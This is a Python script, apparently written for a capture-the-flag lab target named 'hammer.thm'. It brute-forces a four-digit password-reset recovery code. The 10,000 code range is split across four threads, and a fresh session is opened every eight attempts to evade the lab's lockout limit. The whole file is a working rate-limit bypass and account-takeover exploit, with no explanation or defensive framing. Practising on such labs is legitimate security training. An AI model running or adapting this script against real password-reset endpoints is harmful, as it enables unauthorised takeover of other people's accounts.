import requests
import threading

url = "http://10.10.240.203:1337/reset_password.php"
data = {"email": "tester@hammer.thm"}

def try_code(start_code, end_code):
    code = start_code
    trying = True

    while trying and code < end_code:
        session = requests.session()
        r1 = session.post(url, data=data)
        attempt_count = 0

        while attempt_count < 8 and code < end_code:
            data1 = {
                "recovery_code": str(code).zfill(4),
                "s": "120"
            }
            r2 = session.post(url, data=data1)
            if 'Invalid or expired recovery code' not in r2.text:
                print(f"[+] Success with code: {data1['recovery_code']}")
                trying = False
                break
            else:
                print(f"[-] Failed with {data1['recovery_code']}")

            code += 1
            attempt_count += 1

threads = []
ranges = [(0, 2500), (2500, 5000), (5000, 7500), (7500, 10000)]

for r in ranges:
    t = threading.Thread(target=try_code, args=(r[0], r[1]))
    threads.append(t)
    t.start()

for t in threads:
    t.join()